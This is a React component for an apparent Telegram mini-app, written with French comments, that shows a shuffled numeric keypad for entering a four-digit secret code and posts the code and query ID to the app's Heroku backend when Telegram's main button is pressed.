import React, { useCallback, useEffect, useState } from 'react';
import './sass/style.scss';
import { useTelegram } from "./hooks/useTelegram";

const App = () => {
  const { tg, queryId } = useTelegram();
  let tab = []
  function shuffle(array) {
    array.sort(() => Math.random() - 0.5);
    return array
  }

  useEffect(() => {
    tg.ready();
  }, [])

  const [field, setField] = useState(new Array(4).fill(""));
  const [randomBtn, setRandomBtn] = useState(shuffle([1,2,3,6,4,5,7,8,9,0]));
  const [visible, setVisiblity] = useState(false);
  let code = field.join("")

// ajouter la valeur du chiffre appuyé dans le tableau field
  const addValue = (val) => {
    if (isNaN(val)) return false
    for (let i = 4; i > -1; i--) {
      if (field[i] === "") {
        setField([...field.map((d, idx) => (idx === i ? val : d))]);
      }
    }
  }

// interdiction de focus des champs
  const handleChange = (element, index) => {
    //Focus input suivant
    if (element.nextSibling) {
      element.nextSibling.focus();
    }
  };

// cacher ou rendre visible le code secret
  let Icon = visible ? "eye-slash" : "eye";
  let InputType = visible ? "text" : "password";
 
// envoi de données au backend
  const onSendData = useCallback(() => {
    const data = {
      code,
      queryId,
    }
    fetch('https://formbotmessenka.herokuapp.com/web-data', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data)
    })
  }, [code])

// en cas de clique sur le bouton validé de Telegram
  useEffect(() => {
    tg.onEvent('mainButtonClicked', onSendData)
    return () => {
      tg.offEvent('mainButtonClicked', onSendData)
    }
  }, [onSendData])

// configuration du bouton validé de telegram
  useEffect(() => {
    tg.MainButton.setParams({
      text: 'Valider',
      color: '#ff914c'
    })
  }, [])

  // gestion de l'affichage du bouton
  useEffect(() => {
    if (code.length == 4) {
      tg.MainButton.show();
    } else {
      tg.MainButton.hide();
    }
  }, [code])
 
  // retour fontend
  return (
    <div>
      <div className="container-content">
        <div className="otp-container">
          <div className="nav d-flex align-item-center">
            <img src="./logo.png" alt="" />
          </div>
          <div className="text">
            <p>Veuillez entrer le code secret</p>
          </div>
          <div className="otp-input d-flex">
            {field.map((data, index) => {
              return (
                <input
                  className="input"
                  type={InputType}
                  name="codeS"
                  maxLength="1"
                  key={index}
                  value={data}
                  onChange={e => {
                    handleChange(e.target, index)
                  }}
                  onFocus={e => e.target.select()}
                  disabled
                />

              );
            })}
          </div>
          {/* {
            code.length < 4 ? <span className="text-danger">
              <i className="fas fa-exclamation-triangle"></i>
              Remplissez tous les champs SVP!
            </span> : ""
          } */}

          <div className="keyboard d-flex flex-wrap">

            <button className="btn num-1 num" onClick={() => { addValue(randomBtn[0]) }} >{randomBtn[0]}</button>
            <button className="btn num-2 num" onClick={() => { addValue(randomBtn[1]) }} >{randomBtn[1]}</button>
            <button className="btn num-3 num" onClick={() => { addValue(randomBtn[2]) }}>{randomBtn[2]}</button>
            <button className="btn num-4 num" onClick={() => { addValue(randomBtn[3]) }}>{randomBtn[3]}</button>
            <button className="btn num-5 num" onClick={() => { addValue(randomBtn[4]) }}>{randomBtn[4]}</button>
            <button className="btn num-6 num" onClick={() => { addValue(randomBtn[5]) }}>{randomBtn[5]}</button>
            <button className="btn num-7 num" onClick={() => { addValue(randomBtn[6]) }}>{randomBtn[6]}</button>
            <button className="btn num-8 num" onClick={() => { addValue(randomBtn[7]) }}>{randomBtn[7]}</button>
            <button className="btn num-9 num" onClick={() => { addValue(randomBtn[8]) }}>{randomBtn[8]}</button>
            <button className="btn num-n num"
              onClick={() => setVisiblity(visiblity => !visiblity)}
            >
              <i className={'fas fa-' + Icon} ></i>
            </button>
            <button className="btn num-0 num" onClick={() => { addValue(randomBtn[9]) }}>{randomBtn[9]}</button>
            <button className="btn remove"
              onClick={e => setField([...field.map(v => "")])}
            ><i className="fas fa-backspace"></i></button>
            {/* <button className="btn btn-verify d-flex align-item-center justify-content-center"
            >
              valider
            </button> */}

          </div>
        </div>
      </div>
    </div>
  );
};

export default App;